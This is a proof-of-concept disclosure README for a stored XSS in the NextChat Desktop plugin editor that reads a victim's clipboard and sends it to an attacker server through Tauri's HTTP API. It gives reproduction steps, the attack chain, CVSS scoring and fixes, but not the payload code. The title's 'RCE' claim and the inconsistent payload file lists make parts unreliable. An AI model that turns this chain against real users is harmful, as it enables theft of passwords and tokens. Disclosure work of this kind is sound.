# NextChat Desktop RCE via Plugin XSS — PoC

**CVE:** Pending assignment
**CWE:** CWE-79 (Stored/DOM XSS) → Clipboard Theft + CORS Bypass
**CVSS 3.1:** 7.1 High — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**Affected:** NextChat Desktop (Tauri) ≤ 2.15.8 — Windows, macOS, Linux

---

## Summary

A stored XSS in the plugin editor (`app/components/plugin.tsx:348`) combined
with a permissive Tauri desktop configuration (`withGlobalTauri: true`,
`csp: null`) allows a remote attacker to steal clipboard contents (passwords,
API keys, tokens) and make arbitrary HTTP requests from the victim's machine
(bypassing CORS, reaching internal network). The only user interaction
required is loading a plugin from an attacker-controlled URL (one click).

## Reproduction (< 5 minutes, no build required)

### What you need

| #  | Requirement            | How to get it |
|----|------------------------|---------------|
| 1  | NextChat Desktop (.exe/.dmg/.AppImage) | Download **v2.15.8** from links below. **Do NOT use** nextchat.club — that is the commercial SaaS version with a different UI. |
| 2  | Python 3               | Pre-installed on macOS/Linux. On Windows: `winget install Python.Python.3.12` or [python.org](https://www.python.org/downloads/) |
| 3  | This `poc/` folder     | Already in this repository |

> **No compilation, no Rust, no Node.js, no yarn.** The official pre-built
> binary contains the identical vulnerable `tauri.conf.json`.

### Step 1 — Download and install NextChat Desktop (open-source Tauri build)

> **IMPORTANT:** Do NOT use the app from `nextchat.club` — that is the commercial
> SaaS version with a different UI that does not expose the plugin editor.
> You need the **open-source Tauri desktop build** from GitHub Releases.

**Direct download links (v2.15.8):**

| Platform | File | Link |
|----------|------|------|
| Windows (exe) | `NextChat_2.15.8_x64-setup.exe` (6.1 MB) | [Download](https://github.com/ChatGPTNextWeb/NextChat/releases/download/v2.15.8/NextChat_2.15.8_x64-setup.exe) |
| Windows (msi) | `NextChat_2.15.8_x64_en-US.msi` (6.6 MB) | [Download](https://github.com/ChatGPTNextWeb/NextChat/releases/download/v2.15.8/NextChat_2.15.8_x64_en-US.msi) |
| macOS (universal) | `NextChat_2.15.8_universal.dmg` (13.5 MB) | [Download](https://github.com/ChatGPTNextWeb/NextChat/releases/download/v2.15.8/NextChat_2.15.8_universal.dmg) |
| Linux (AppImage) | `next-chat_2.15.8_amd64.AppImage` (87.2 MB) | [Download](https://github.com/ChatGPTNextWeb/NextChat/releases/download/v2.15.8/next-chat_2.15.8_amd64.AppImage) |
| Linux (deb) | `next-chat_2.15.8_amd64.deb` (7.9 MB) | [Download](https://github.com/ChatGPTNextWeb/NextChat/releases/download/v2.15.8/next-chat_2.15.8_amd64.deb) |

**Install:**

- **Windows:** Double-click `NextChat_2.15.8_x64-setup.exe`. Default options are fine.
- **macOS:** Open `NextChat_2.15.8_universal.dmg`, drag NextChat to Applications.
- **Linux:** `chmod +x next-chat_2.15.8_amd64.AppImage && ./next-chat_2.15.8_amd64.AppImage`

### Step 2 — Start the exploit server

Open a terminal in this `poc/` directory:

```
python3 exploit_server.py --port 8888
```

On Windows (if `python3` is not recognized):
```
python exploit_server.py --port 8888
```

The server prints your local IP and the payload URL:

```
  Plugin URL: http://192.168.1.100:8888/plugin.yaml
```

Leave this terminal open.

### Step 3 — Trigger the exploit

1. **Open NextChat Desktop** (the open-source Tauri build, NOT nextchat.club)
2. In the sidebar, click **"Discovery"** (compass icon, next to "Mask")
3. A popup selector appears — click **"Plugin"**
4. On the Plugins page, click **"Create"** (top-right)
5. In the **"Edit Plugin"** modal, find the **"OpenAPI Schema"** row
6. Paste the payload URL in the text input field:
   ```
   http://<your-ip>:8888/plugin.yaml
   ```
   (Use the URL the exploit server printed, or `http://127.0.0.1:8888/plugin.yaml` if testing locally)
7. Click the **"Load From URL"** button next to the input

### Step 4 — Verify the result

**In the NextChat window:**
- A **red banner** appears at the top: `[PoC] Clipboard stolen and exfiltrated to attacker server`
- The window title changes to `[PWNED] NextChat XSS`

**In the exploit server terminal:**
```
  ==========================================================
  [EXFILTRATION] POST from 127.0.0.1
  Clipboard: <whatever text was on the victim's clipboard>
  Platform: Win32
  Timestamp: 2026-10-30T...
  ==========================================================
```

The victim's **clipboard contents** (passwords, API keys, tokens, etc.) are
silently read and exfiltrated to the attacker's server — no user interaction
beyond the initial plugin load.

### Optional: Test with diagnostic payload (Stage 0)

To see detailed information about which Tauri APIs are accessible:

```
python3 exploit_server.py --port 8888 --payload stage0
```

This shows an alert listing the full `__TAURI__` API surface available to the attacker.

---

## Root Cause

Three conditions combine to form the vulnerability:

| # | Condition | Location | Detail |
|---|-----------|----------|--------|
| 1 | **Unsanitized innerHTML** | `app/components/plugin.tsx:348` | `dangerouslySetInnerHTML={{ __html: editingPlugin.content }}` renders raw plugin content with zero sanitization |
| 2 | **Unrestricted remote input** | `app/components/plugin.tsx:89-117` | `loadFromUrl()` fetches arbitrary URLs and stores response text directly into `plugin.content` |
| 3 | **Permissive Tauri config** | `src-tauri/tauri.conf.json` | `withGlobalTauri: true` (line 8) + `csp: null` (line 94) + `fs.all: true` without scope (line 48-49) |

## Attack Chain

```
Attacker hosts malicious OpenAPI YAML with <img onerror="..."> payload
    │
    ▼
Victim pastes URL in NextChat plugin editor → clicks Load
    │
    ▼
loadFromUrl() fetches YAML → JSON.parse fails → raw text stored as plugin.content
    │
    ▼
dangerouslySetInnerHTML renders the entire YAML including the <img> tag as HTML
    │
    ▼
Browser fires onerror → JavaScript executes in Tauri WebView context
    │
    ▼
window.__TAURI__.clipboard.readText() steals clipboard contents
    │
    ▼
window.__TAURI__.http.fetch() exfiltrates data to attacker (bypasses CORS)
    │
    ▼
Attacker receives victim's clipboard (passwords, API keys, tokens, etc.)
```

## Payload Stages

| Stage | File | What it does |
|-------|------|-------------|
| **0** | `stage0_diagnostic.yaml` | Shows alert with full `__TAURI__` API surface and write/read test results |
| **1** (default) | `stage1_clipboard_exfil.yaml` | Steals clipboard contents and exfiltrates to attacker server via Tauri HTTP |
| **1-fs** | `stage1_rce_file_write.yaml` | Attempts filesystem write (blocked by default scope in v2.15.8 binary) |

## Confirmed Impact (tested on v2.15.8 Windows)

| # | Attack | Status | Evidence |
|---|--------|--------|----------|
| 1 | **Stored XSS** in desktop app | CONFIRMED | `<img onerror>` executes JavaScript in Tauri WebView |
| 2 | **`__TAURI__` API access** | CONFIRMED | `window.__TAURI__` exposes fs, http, clipboard, dialog, notification, shell |
| 3 | **Clipboard theft** | CONFIRMED | `clipboard.readText()` silently reads clipboard (passwords, API keys, tokens) |
| 4 | **HTTP CORS bypass** | CONFIRMED | `http.fetch()` makes arbitrary HTTP requests from victim's machine (bypasses CORS, reaches internal network) |
| 5 | **Clipboard exfiltration** | CONFIRMED | Stolen clipboard data sent to attacker server via Tauri HTTP |
| 6 | **Filesystem read/write** | BLOCKED | Default empty scope prevents direct fs operations (defense-in-depth) |

### CVSS Scoring

**CVSS 3.1:** 7.1 High — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`

| Metric | Value | Rationale |
|--------|-------|-----------|
| Attack Vector | Network | Attacker hosts malicious URL |
| Attack Complexity | Low | Single click to load plugin |
| Privileges Required | None | No authentication needed |
| User Interaction | Required | Victim must load the plugin URL |
| Scope | Changed | Escapes WebView into OS clipboard and network |
| Confidentiality | Low | Clipboard contents stolen (single snapshot, not persistent keylogger) |
| Integrity | Low | Can write to clipboard, make HTTP requests on behalf of victim |
| Availability | None | No denial of service |

## Tauri APIs Exposed to Attacker

| API | Config | Confirmed | Capability |
|-----|--------|-----------|------------|
| `clipboard` | `all: true` | **YES** | Read/write clipboard silently |
| `http` | `all: true`, scope `http://* https://*` | **YES** | HTTP to any host (bypasses CORS, reaches internal network) |
| `dialog` | `all: true` | available | Show native save/open/message dialogs (phishing) |
| `notification` | `all: true` | available | Send fake OS notifications (phishing) |
| `shell` | `open: true` | available | Open URLs in default browser |
| `fs` | `all: true`, empty scope | **BLOCKED** | APIs enabled but default scope prevents read/write |

## Recommended Fixes

1. **Replace innerHTML with textContent:**
   ```tsx
   <code ref={el => { if (el) el.textContent = editingPlugin.content; }} />
   ```

2. **Enable CSP in Tauri:**
   ```json
   "csp": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
   ```

3. **Restrict filesystem scope:**
   ```json
   "fs": { "all": true, "scope": ["$APPDATA/*", "$RESOURCE/*"] }
   ```

4. **Disable `withGlobalTauri` in production:**
   ```json
   "withGlobalTauri": false
   ```

## Files

```
poc/
├── exploit_server.py                  # HTTP server with CORS + exfil logging
├── verify_vuln.sh                     # Checks 6 vuln conditions in source
├── payloads/
│   ├── stage1_rce_file_write.yaml     # Proof file write (default)
│   ├── stage2_exfiltrate.yaml         # Read file + exfiltrate
│   └── stage3_persist_linux.yaml      # Autostart persistence (Linux)
├── build-desktop.sh                   # Build helper (bash) — only if building from source
├── build-desktop.ps1                  # Build helper (PowerShell) — only if building from source
└── README.md                          # This file
```
